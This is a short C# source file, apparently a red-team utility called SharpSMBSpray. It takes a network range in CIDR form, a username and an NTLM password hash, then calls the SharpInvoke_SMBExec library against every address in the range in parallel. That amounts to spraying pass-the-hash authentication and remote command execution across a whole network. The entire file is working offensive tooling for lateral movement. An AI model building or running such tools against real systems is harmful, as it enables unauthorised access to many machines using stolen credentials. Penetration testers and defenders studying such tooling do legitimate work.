using System;
using System.Threading.Tasks;
using LukeSkywalker.IPNetwork;

namespace SharpSMBSpray
{
    class Program
    {
        public static void Main(string[] args)
        {
            string target = args[0];
            string username = args[1];
            string hash = args[2];
            // Parse CIDR
            IPNetwork ipn = IPNetwork.Parse(target);
            IPAddressCollection ips = IPNetwork.ListIPAddress(ipn);
            // Parallel ForEach to iterate over IP's from CIDR block
            Parallel.ForEach(ips, (ip) =>
            {
                try
                {
                    string[] arguments;
                    string targetIP = ip.ToString();
                    arguments = new string[3] { targetIP, username, hash };
                    SharpInvoke_SMBExec.Program.Main(arguments);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            });     
        }
    }
}
